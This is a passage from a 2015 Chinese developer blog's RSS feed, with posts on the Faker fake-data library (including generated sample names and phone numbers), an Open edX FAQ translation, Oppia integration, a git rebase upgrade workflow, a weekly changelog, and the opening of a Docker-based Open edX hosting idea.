class="n"&gt;fake&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;phone_number&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;phone_number&lt;/span&gt; &lt;span class="c1"&gt;#Student(name,address,phone_number)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;输出为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;危莉 超市皇路u座 109784 18689765254
富东 琴市东街Q座 532875 15549156990
白宇 帆市闵街Y座 106094 14580766320
俞玉英 坤市督街k座 509819 13771875966
陆淑珍 娟市乐路X座 113166 15929147106
束红梅 磊市贲街h座 699061 15315800191
牧秀云 杰市滕街l座 315704 14564550529
游平 敏市牧街D座 152585 18580747599
万雷 桂花市屈路t座 423929 15649801854
司华 慧市索街b座 208656 13748193777
尹华 春梅市荀街d座 834796 13621273546
赖桂兰 丽丽市白街Z座 759194 18948910936
卜勇 秀珍市冷路r座 589146 15565418368
终婷婷 军市丁路v座 724209 14720124023
东芳 桂英市谭街Z座 570071 18558694020
羊红霞 丹市柴街q座 806049 13153710279
芮倩 琴市席街p座 291743 15030602445
阮淑珍 丽丽市滕路q座 911886 18900809224
丁芳 冬梅市佴路V座 424657 13332629139
车畅 玉珍市蓝路v座 549485 15826010349
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你看睁眼说瞎话容易多了吧！&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;例子过后，下边我们来正式介绍下faker&lt;/p&gt;
&lt;h1&gt;What&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Faker is a Python package that generates fake data for you. Whether you need to bootstrap your database, create good-looking XML documents, fill-in your persistence to stress test it, or anonymize data taken from a production service, Faker is for you.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;少量数据我们还可以自己瞎编，一旦数据变多，faker的好处就体现出来了，这对自动化很有好处&lt;/p&gt;
&lt;h1&gt;使用演示&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;fake&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# &amp;#39;Lucy Cechtelar&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;fake&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# &amp;quot;426 Jordy Lodge&lt;/span&gt;
&lt;span class="c1"&gt;#  Cartwrightshire, SC 88120-6700&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;fake&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# Sint velit eveniet. Rerum atque repellat voluptatem quia rerum. Numquam excepturi&lt;/span&gt;
&lt;span class="c1"&gt;# beatae sint laudantium consequatur. Magni occaecati itaque sint et sit tempore. Nesciunt&lt;/span&gt;
&lt;span class="c1"&gt;# amet quidem. Iusto deleniti cum autem ad quia aperiam.&lt;/span&gt;
&lt;span class="c1"&gt;# A consectetur quos aliquam. In iste aliquid et aut similique suscipit. Consequatur qui&lt;/span&gt;
&lt;span class="c1"&gt;# quaerat iste minus hic expedita. Consequuntur error magni et laboriosam. Aut aspernatur&lt;/span&gt;
&lt;span class="c1"&gt;# voluptatem sit aliquam. Dolores voluptatum est.&lt;/span&gt;
&lt;span class="c1"&gt;# Aut molestias et maxime. Fugit autem facilis quos vero. Eius quibusdam possimus est.&lt;/span&gt;
&lt;span class="c1"&gt;# Ea quaerat et quisquam. Deleniti sunt quam. Adipisci consequatur id in occaecati.&lt;/span&gt;
&lt;span class="c1"&gt;# Et sint et. Ut ducimus quod nemo ab voluptatum.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;中文本地化相关&lt;/h1&gt;
&lt;p&gt;&lt;a href="http://fake-factory.readthedocs.org/en/master/locales/zh_CN.html"&gt;locales/zh_CN&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/joke2k/faker"&gt;joke2k/faker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://fake-factory.readthedocs.org/en/master/index.html"&gt;fake-factory factory.readthedocs.org&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 23 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-23:fake-data-factory.html</guid><category>dev-tools</category></item><item><title>关于Open edX[译文]</title><link>/about-Open-edX.html</link><description>&lt;p&gt;EdX是一个非盈利的在线组织，由哈佛大学和麻省理工大学发起。同时，成员包括大量的全球领先机构与联盟。EdX提供交互式的在线课程和慕课，内容来自全球最顶尖的大学或者机构。&lt;/p&gt;
&lt;p&gt;Open edX是驱动edX课程的开源平台。通过我们的开源协议，社区可以免费使用edX代码。机构可以拥有他们的Open edX平台实例，并上线他们自己的课程。教育工作者们可以扩充、利用这个平台来建立他们真正需要的学习工具。同时，开发人员可以将一些新的特性贡献到Open edX平台。&lt;/p&gt;
&lt;p&gt;我们的目标是建立一个生机勃勃的、国际化的社区，教育者以及技术开发者可以在其中随时随地分享有利于学生教育的创新思想。我们诚挚邀请您与我们一起探索Open edx，并加入我们这个正在迅速发展的组织中来。&lt;/p&gt;
&lt;h1&gt;常见问题（FAQ）&lt;/h1&gt;
&lt;h3&gt;什么是Open edx？&lt;/h3&gt;
&lt;p&gt;Open edx是一个免费、开源的课程管理系统，由edX发起。Open edX平台托管了全球范围内的大量大型开放式课程（慕课），并适用于小型课堂和培训。&lt;/p&gt;
&lt;h3&gt;Open edX包括哪些内容？&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Open edX Studio （课程制作平台）&lt;/li&gt;
&lt;li&gt;The Open edX LMS（学习管理系统）&lt;/li&gt;
&lt;li&gt;The capa_module XBlock， 一种基于LON-CAPA问题类型的实现&lt;/li&gt;
&lt;li&gt;The ORA2 XBlock， 一个开放性回答评估问题类型的实现&lt;/li&gt;
&lt;li&gt;论坛&lt;/li&gt;
&lt;li&gt;Open edx Insights（数据可视化组件）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;什么是Open edx Studio？&lt;/h3&gt;
&lt;p&gt;Studio 是一种可以帮助你在Open edx建立课程的工具。你可以使用Studio建立课程结构，并在其中添加课程内容，包括问题、视频以及给学习者的其他资源。&lt;/p&gt;
&lt;p&gt;同样，你可以使用Studio管理课程安排和课程团队，建立分级制度（评分），发布课程的每一个部分等等。&lt;/p&gt;
&lt;p&gt;你可以直接使用浏览器进入Studio。不需要其他任何额外的软件。&lt;/p&gt;
&lt;h3&gt;什么是 Open edX LMS？&lt;/h3&gt;
&lt;p&gt;LMS是一种帮助学习者进行课程内容学习的工具，课程内容包括视频，课本和一些问题，并且能确保课程的同步更新。Open edX LMS 同时提供论坛讨论和维基功能，学习者和课程团队成员可以在其中分享知识。&lt;/p&gt;
&lt;p&gt;对于课程团队成员来说， LMS 包括Instructor Dashboard ,可以通过它注册学习者，生成成绩单，以及管理正在进行的课程。&lt;/p&gt;
&lt;p&gt;你可以直接使用浏览器进入LMS。不需要其他任何额外的软件。&lt;/p&gt;
&lt;h3&gt;什么是XBlock？&lt;/h3&gt;
&lt;p&gt;XBlock是Open edX课程元素的组件架构。开发者创建XBlocks来创造一个独立的课程组件，该组件与其他组件在课程中无缝连接。&lt;/p&gt;
&lt;p&gt;例如，你可以建立XBlocks来展示一个特别的问题，或者是一系列的文本，或者是HTML内容。此外，XBlocks是可组合的：你可以建立XBlocks来呈现庞大的结构体系，例如一小结，一个章节，或者是一整个课程。通过组合这些服务于多种目的的Xblocks，从文本、视频到多选题单选题，我们可以构建复杂的、协作式的以及交互式的学习体验，课程团队可以创建丰富而有吸引力的课程内容。&lt;/p&gt;
&lt;p&gt;Xblocks的主要的优势之一是他们是插件式的.你所写的代码可以适用于任何edX平台或者其他的Xblock运行环境里，同时他们可被任何课程团队使用。&lt;/p&gt;
&lt;h3&gt;如何试用Open edX?&lt;/h3&gt;
&lt;p&gt;通过与Bitnami合作，edX 提供Open edX Cypress的虚拟机镜像。虚拟机镜像适用于大量的云平台，并且给你以受控方式运行Open edX。更多的信息请登录&lt;a href="https://open.edx.org/blog/open-edx-cypress-virtual-machine-images-now-available-thanks-bitnami"&gt;Open edX Cypress Virtual Machine Image Now Available Thanks to Bitnami&lt;/a&gt;博客。&lt;/p&gt;
&lt;p&gt;另一种方式是安装和运行Open edX Developer Stack或者Devstack.&lt;/p&gt;
&lt;p&gt;还有许多Open edX供应商提供了解决办案，可以查看&lt;a href="https://github.com/edx/edx-platform/wiki/List-of-Open-edX-service-providers"&gt;list in GitHub&lt;/a&gt;。&lt;/p&gt;
&lt;h3&gt;什么是Devstack？我该如何运行？&lt;/h3&gt;
&lt;p&gt;Devstack 是为本地开发设计的一个虚拟机镜像。通过运行Devstack 
你可以提早发现和修复系统问题。Devstack简化某些生产环境下的配置为了使本地开发更加便利。例如，nginx和gunicorn 在Devstack被禁用；Devstack 用Django的runserver替代。更多的信息可以参考&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/install_options.html#open-edx-developer-stack"&gt;Open edX Developer Stack&lt;/a&gt;，在&lt;a href=""&gt;Installing ,Configuring ,and Running an Open edX Instance&lt;/a&gt;链接里&lt;/p&gt;
&lt;h3&gt;从哪里寻找文档？&lt;/h3&gt;
&lt;p&gt;你可以在&lt;a href="http://docs.edx.org/"&gt;docs.edx.org&lt;/a&gt;网站上找到所有的Open edX文档。在标题为Open edX Documentation:Latest Release，你可以找到关于Open edX开发者，服务提供者，课程团队还有学习者最新的指导说明。这个指导说明会根据加入到平台中的新特性不断地更新。同样你可以在该页面找到支持Open edX release的文档，最近的一篇名为Open edX Cypress Release。这部分的指导说明针对具体的发行版.&lt;/p&gt;
&lt;p&gt;当你使用Studio，可以通过帮助菜单找到文档。如果你在使用Open edX稳定版,帮助菜单会把你导向正确的课程创建指导手册。&lt;/p&gt;
&lt;p&gt;开发者还可以从源码库里上找到wiki页面，获得帮助。&lt;/p&gt;
&lt;p&gt;EdX正在持续地提升文档质量。Open edX文档团队欢迎您的反馈和意见。可以联系我们docs@edx.org。&lt;/p&gt;
&lt;h3&gt;我可以在哪里寻求帮助？&lt;/h3&gt;
&lt;p&gt;除了Open edX门户网站，开发者也可以加入许多不同的谷歌讨论组，可以提问或者与爱好者们、edX职员一起讨论。详情请见&lt;a href="https://open.edx.org/resources/community-discussions"&gt;Community Discussions&lt;/a&gt;.&lt;/p&gt;
&lt;h1&gt;原文&lt;/h1&gt;
&lt;p&gt;&lt;a href="https://open.edx.org/about-open-edx"&gt;About Open edX&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 18 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-18:about-Open-edX.html</guid><category>edx</category></item><item><title>Open edX国内社区演示平台</title><link>/open-edx-cn-sandbox.html</link><description>&lt;h1&gt;公告&lt;/h1&gt;
&lt;p&gt;施工中...&lt;/p&gt;
&lt;p&gt;准备基于中旬的稳定版(Dogwood)来搭建，在等该版本的发布&lt;/p&gt;
&lt;h1&gt;演示平台概述&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;由社区构建，开放给社区成员的一个sandbox平台。用以演示、研究与交流&lt;/li&gt;
&lt;li&gt;平台完全开放：开放注册、允许创建课程、公开track log给研究者、同时对外公布平台状态，以便大家研究真实环境、与提供性能优化建议&lt;/li&gt;
&lt;li&gt;基于Open edX最新稳定版构建（当前是Cypress）&lt;/li&gt;
&lt;li&gt;与国内社区开发进度保持同步&lt;/li&gt;
&lt;li&gt;接受用户在平台上展开真实课程，课程归创建者所有&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;目标&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;展示社区版特性&lt;/li&gt;
&lt;li&gt;将数据开放给研究者，免去构建平台的繁琐&lt;/li&gt;
&lt;li&gt;积累在真实环境下的运行数据和经验&lt;/li&gt;
&lt;li&gt;考虑到各商业公司的隐私和不便，希望该平台能为开发者提供一个共同围绕的中心，用以交流和研究&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;平台参数&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Ubuntu12.04&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;平台地址&lt;/h1&gt;
&lt;h1&gt;贡献者&lt;/h1&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 18 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-18:open-edx-cn-sandbox.html</guid><category>edx</category></item><item><title>Open edX生态之Oppia</title><link>/open-edx-ecology-Oppia.html</link><description>&lt;p&gt;Open edX最令人激动之处，莫过于它的开放性和Xblock体系，由此带来了构建生态系统的可能。&lt;/p&gt;
&lt;p&gt;Oppia是google推出的一款在线教育工具，基于Python和AngularJS，完全开放源代码。该项目让用户创建在线互动活动，以便其他人参与学习。&lt;/p&gt;
&lt;p&gt;Oppia目前一共开源了两个项目，一个是他们的核心源码&lt;a href="https://github.com/oppia/oppia"&gt;oppia/oppia&lt;/a&gt;，另一个就是&lt;a href="https://github.com/oppia/xblock"&gt;oppia/xblock&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;通过&lt;a href="https://github.com/oppia/xblock"&gt;oppia/xblock&lt;/a&gt;。我们可以把Oppia创作的课件集成到Open edX中&lt;/p&gt;
&lt;p&gt;这是个绝佳的案例，让我们看到Open edX的开放性带来的有趣局面&lt;/p&gt;
&lt;h1&gt;What&lt;/h1&gt;
&lt;p&gt;一图胜千言，我们先直观感受下Oppia&lt;/p&gt;
&lt;p&gt;首页
&lt;img alt="1" src="img/edx/oppia/oppia1.png" /&gt;&lt;/p&gt;
&lt;p&gt;Oppia explorations
&lt;img alt="2" src="img/edx/oppia/oppia2.png" /&gt;&lt;/p&gt;
&lt;p&gt;下面是Oppia的自我介绍&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Oppia is an online learning tool that enables anyone to easily create and share interactive activities (called 'explorations'). These activities simulate a one-on-one conversation with a tutor, making it possible for students to learn by doing and get feedback.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;explorations的叫法很是贴切，我们不妨截几张学习活动图&lt;/p&gt;
&lt;p&gt;&lt;img alt="4" src="img/edx/oppia/oppia3.png" /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="5" src="img/edx/oppia/oppia4.png" /&gt;&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Oppia有着与Open edX完全不同的特质，Open edX定位为platform，而Oppia更像是一个tool，一个致力于提供交互式学习体验的工具。&lt;/p&gt;
&lt;p&gt;我将Oppia视为某种学习理论的技术实现。在这里可能是对反馈的强调&lt;/p&gt;
&lt;p&gt;如google所言&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;观看音乐家的表演视频，你永远都无法学会钢琴&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在线教育不应该仅仅局限于视频、音频和文字。在学习过程中，反馈是关键&lt;/p&gt;
&lt;p&gt;Oppia有趣还在于它不仅仅可以展示内容，还收集用户的互动数据。活动创建者可以根据这些反馈数据，来优化Oppia explorations（课件）。如果很多学员反馈学习方式不当，创建者就可以据此改良。&lt;/p&gt;
&lt;h1&gt;How&lt;/h1&gt;
&lt;h2&gt;安装Oppia&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://github.com/oppia/oppia#installation"&gt;oppia/oppia#installation&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;制作Oppia explorations （类似Open edX中的课件）&lt;/h2&gt;
&lt;p&gt;&lt;img alt="8" src="img/edx/oppia/oppia8.png" /&gt;&lt;/p&gt;
&lt;h2&gt;集成到Open edX中&lt;/h2&gt;
&lt;p&gt;&lt;img alt="5" src="img/edx/oppia/oppia5.png" /&gt;
&lt;img alt="6" src="img/edx/oppia/oppia6.png" /&gt;
&lt;img alt="7" src="img/edx/oppia/oppia7.png" /&gt;&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;如果我们将Oppia视为外部组件(它本身也可以是自治的)，将Open edX视为平台，这种视角能给我们很大的启发性。通过安装Open edX，我们获得了一个扩展性极强，功能完备的平台，而通过Xblock很容易将外部组件集成进来，那么针对具体的定制需求我们几乎都不必侵入Open edX本身。&lt;/p&gt;
&lt;p&gt;从Oppia中我们看到这种可能性，即便是一个学习理念的具体实现平台，也可以毫无费力地集成进来，那么理论上还有什么是无法集成的呢。还有什么是非侵入不可的呢&lt;/p&gt;
&lt;p&gt;如果这种隔离和集成是做得到的，那么edX就可以不断往通用平台发展，不断健壮与包容，健壮带来了稳定而开放性让它能接受所有新的教育理念（很可能是某种具体实现）&lt;/p&gt;
&lt;p&gt;最终成为一种生态体系。&lt;/p&gt;
&lt;h1&gt;补遗&lt;/h1&gt;
&lt;p&gt;值得一提的是，Oppia的文档写的非常好，好比下边的这个开发者引导&lt;a href="https://github.com/oppia/oppia/blob/develop/CONTRIBUTING.md"&gt;develop/CONTRIBUTING&lt;/a&gt;,可以借鉴到Open edX社区&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 18 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-18:open-edx-ecology-Oppia.html</guid><category>edx</category></item><item><title>Open edX定制开发与git rebase</title><link>/open-edx-custom-and-git-rebase.html</link><description>&lt;h1&gt;问题描述&lt;/h1&gt;
&lt;p&gt;折腾Open edX的过程中，我们得做许多自己的定制。&lt;/p&gt;
&lt;p&gt;将定制内容封装成xblock或django app是最好不过，迁移起来是方便的。可如果不得不侵入源码，诸如修改模板之类（这类事总会遇到）。那么如何在迁移edx的版本的过程中，同步自己定制的内容，是个很让人头疼的问题&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;这个问题我能想到的最佳方案是使用&lt;code&gt;模块化的思路&lt;/code&gt;和&lt;code&gt;版本管理系统&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;关于模块化的思路，我在&lt;a href="http://wwj718.github.io/edx-development.html"&gt;edX开发相关&lt;/a&gt;里总结过，不妨搬过来：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;把代码尽量的模块化，定制的功能，可以的话，尽量整个丢到django app里&lt;/li&gt;
&lt;li&gt;尽量不要去入侵edx-platform源代码，尽可能采用非侵入式插件风格的定制
诸如主题的定制，你应当使用theme，而不是去改templates&lt;/li&gt;
&lt;li&gt;诸如要课程分类，添加属性，尽量不要去动课程模型，而是自建model，采用course_id关联到原有课程。而后整个功能模块丢到django app里。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;至于如何利用&lt;code&gt;版本管理系统&lt;/code&gt;来方便我们进行版本变迁，此前并没细说，在此总结下&lt;/p&gt;
&lt;h1&gt;git层面的视角&lt;/h1&gt;
&lt;p&gt;让我们从git层面来看看我们面临的是怎样的问题&lt;/p&gt;
&lt;p&gt;我们首先fork了&lt;a href="https://github.com/edx/edx-platform"&gt;edx/edx-platform&lt;/a&gt;，于是我们有了一个自己的副本（远程仓库），对此有读写权限，在开发环境中，把它clone到本地，checkout出当前最新的稳定版&lt;a href="https://github.com/edx/edx-platform/tree/named-release/cypress.rc"&gt;named-release/cypress.rc&lt;/a&gt;，在此之上建立自己的开发分支，就可以开发我们想要的功能了，如果是团队协作，那么一般以{yourname}/{feature}命名分支，开发完成后，由负责人将新功能merge到生产分支(product)上&lt;/p&gt;
&lt;p&gt;至此问题都不大，小伙伴们其乐融融，齐头并进&lt;/p&gt;
&lt;p&gt;忽然有一天edX宣布说Dogwood版本正式发布，大家期待多时的数据分析功能也可本地使用了。那么多数人都会想升级版本。&lt;/p&gt;
&lt;p&gt;此后才发现，我们都有了许多历史负担，我们有了太多的个性化定制。如果最初没有对定制内容进行管理，那么下面就没你啥事啦，升级的痛苦会让你不愿尝试，尤其是升级从来就不只这一次&lt;/p&gt;
&lt;p&gt;如果你在前头有基于分支来开发定制，那么你只要用好git rebase就可以无痛迁移啦，定制升级两不误！&lt;/p&gt;
&lt;h1&gt;git rebase&lt;/h1&gt;
&lt;p&gt;在&lt;a href="https://github.com/edx/edx-platform"&gt;edx/edx-platform&lt;/a&gt;的wiki中，官方就有给大家打好预防针了，提醒大家以git rebase的方式来平滑迁移迁移内容：&lt;a href="https://github.com/edx/edx-platform/wiki/How-to-Rebase-a-Pull-Request"&gt;How to Rebase a Pull Request&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;不过这显然不是一篇优秀的介绍文档，关于&lt;code&gt;git rebase&lt;/code&gt;，更好的资料是&lt;a href="https://git-scm.com/book/zh/v2/Git-%E5%88%86%E6%94%AF-%E5%8F%98%E5%9F%BA"&gt;Git 分支 - 变基&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;关于git rebase&lt;/h2&gt;
&lt;p&gt;当很多人同时在一个工程上工作的时候，一个拉取请求很快就会过时。一个&lt;code&gt;过时&lt;/code&gt;的拉取请求就是一个不再和开发主线保持同步的开发分支，它在合并到工程里面之前需要被更新.&lt;/p&gt;
&lt;p&gt;如果你的拉取请求已经过时了，在你的分支能被合并之前，你需要将你的分支变基到主分支最新版本。&lt;/p&gt;
&lt;p&gt;这个时候你就需要git rebase的帮助了&lt;/p&gt;
&lt;p&gt;一般来说git rebase就是在以上场合中被使用。&lt;/p&gt;
&lt;h2&gt;开始升级&lt;/h2&gt;
&lt;p&gt;同样的道理，我们也可以git rebase用于将开发分支迁移到不同的提交上(Dogwood/Cypress本质上仅仅是个tag而已，指向某次提交)。&lt;/p&gt;
&lt;p&gt;好比我们要将基于Cypress的wwj/course_category分支迁移到Dogwood版本上，只需要&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git checkout wwj/course_category
git rebase product
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;过程中，可能要处理一些冲突，就像git merge中那样&lt;/p&gt;
&lt;p&gt;其中product是基于named-release/dogwood.rc,现在切换回&lt;code&gt;product&lt;/code&gt;,进行一次快进合并&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git checkout product
git merge wwj/course_category
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;同样的道理，其他特性分支也一并这样做，完成后，升级工作就完成啦！ &lt;br /&gt;
更爽在于，即便之后edX又发布了新版本，我们依然能够按照以上步骤无痛迁移！&lt;/p&gt;
&lt;p&gt;如果了解一些&lt;a href="https://git-scm.com/book/zh/v2/Git-%E5%88%86%E6%94%AF-%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF"&gt;远程分支&lt;/a&gt;相关的知识，这部分会更融通&lt;/p&gt;
&lt;p&gt;不得不承认，git几乎成为了源码管理/协作开发/升级部署的核心&lt;/p&gt;
&lt;p&gt;强大到令人叹为观止&lt;/p&gt;
&lt;h1&gt;资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/wiki/How-to-Rebase-a-Pull-Request"&gt;How to Rebase a Pull Request&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://git-scm.com/book/zh/v2/Git-%E5%88%86%E6%94%AF-%E5%8F%98%E5%9F%BA"&gt;Git 分支 - 变基&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 17 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-17:open-edx-custom-and-git-rebase.html</guid><category>edx</category></item><item><title>Open edX每周简报(20151115)</title><link>/Open-edX-weekly-publication-20151115.html</link><description>&lt;h3&gt;&lt;a href="https://github.com/edx/edx-platform"&gt;edx-platform&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/commit/44b409ebffc7f55e4479d1cd95d8651620d292a6"&gt;Added pagination on grade book&lt;/a&gt;:成绩单在线分页功能&lt;ul&gt;
&lt;li&gt;讨论细节：&lt;a href="https://github.com/edx/edx-platform/pull/10250"&gt;pull/10250:Added pagination on grade book.&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/commit/a62e403ed847753f14262dd0b32710c2514d390b"&gt;Search optimization&lt;/a&gt;：课程搜索最优化&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/commit/78c6a38ca642efb5fc40db6ec3ee6945157f4f79"&gt;LMS: new UI for video player + AFontGarde iconfonts&lt;/a&gt;：视频播放器UI改版&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/pull/9974"&gt;pull/9974&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/commit/cbc57aae6b3de70017e0bf4a2a0f26678ff61a36"&gt;enabled web certs by default&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-platform/pull/10417"&gt;pull/10417&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a href="https://github.com/edx/configuration"&gt;configuration&lt;/a&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/configuration/commit/4b50944d59d121cb30e82c3fe585cf83efd9ca4a"&gt;CMS_COURSE_SHORTCUT_BASE_URL added to Insights&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/configuration/pull/2440/commits"&gt;edxapp on django 1.8 #2440&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 15 Nov 2015 00:00:00 +0000</pubDate><guid>tag:,2015-11-15:Open-edX-weekly-publication-20151115.html</guid><category>edx</category></item><item><title>基于docker构建Open edX云服务之过家家版</title><link>/build-paas-for-edx-dev.html</link><description>&lt;blockquote&gt;
&lt;p&gt;当某个系统能够正常运转时，不要打扰它；要以它为基础来构建。在自然体系中，改良就是在现存的调试好的系统上「打补丁」，原先的层级继续运作，甚至不会注意到其上还有新的层级   --《失控》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我喜欢将《失控》中的这段看作对增量式开发的隐喻&lt;/p&gt;
&lt;p&gt;这也是我顶喜欢的几种构建方式之一&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;前段时间在想，如果我们想提供Open edX的云服务(SaaS)，那么如何入手呢&lt;/p&gt;
&lt;h1&gt;场景&lt;/h1&gt;
&lt;p&gt;用户打开一个网页，就像在阿里云购买一台主机一样，选择主题，绑定域名，上传logo，填写网站名称...，然后点击提交，就生成了一个他自己的Open edX网站&lt;/p&gt;
&lt;h1&gt;联想&lt;/h1&gt;
&lt;p&gt;《失控》中的这段引导我将既有基础视为下层，在不扰乱它的情况下，构建新的层级，用户定制相关的逻辑构建在这一层，而下层对此一无所知。&lt;/p&gt;
&lt;p&gt;想到这一点时，我大为振奋。剩下的工作就是看看我们有哪些现有基础，然后寻找拼图中缺失的版块&lt;/p&gt;
&lt;p&gt;这是一种尝试、过家家式的解决方案，当对阐明原理是足够的，同时它也可以用于开发环境中，好比你完全可以把它融入公司内部的开发工作流里。对提升效率是有帮助的.我们最终至少能得到一种类似Heroku的私有云！&lt;/p&gt;
&lt;h1&gt;现有基础&lt;/h1&gt;
&lt;p&gt;我们目前都有哪些基础呢，我个人公司内部的技术基础，不方便透露。我们可以来看看edx国内社区都有哪些既有的基础。&lt;/p&gt;
&lt;p&gt;首先振奋人心的是，docker版本在实验环境中已经基本可用了，生产版本在我的实验环境中也展示出了可商用的趋势(功能都完备了)，但考虑到edx官方之后会来推进这块，不想跟官方撞车，这块暂时不推进&lt;/p&gt;
&lt;p&gt;同时，社区已经积累了足够的edx定制的经验，通过脚本可以对edx中的各个定制化要素予以定制，诸如主题和汉化甚至djangoapp和xblock都实现了脚本化。&lt;/p&gt;
&lt;h1&gt;思路&lt;/h1&gt;
&lt;p&gt;在设计层面，我们将用户的定制视为信息收集业务，可以单独跑一个django app.收集到的信息，存入数据库，在构建脚本中获取到他们（实际是个传参的过程，数据注入），据此构建出定制化的Open edX示例&lt;/p&gt;
&lt;h1&gt;缺失的版块&lt;/h1&gt;
&lt;p&gt;那么我们还缺什么呢，缺的是一个开源的管理docker的工具，好在我们有github呀&lt;/p&gt;
&lt;p&gt;到github上一搜，发现了&lt;/p&gt;
&lt;ul&gt;
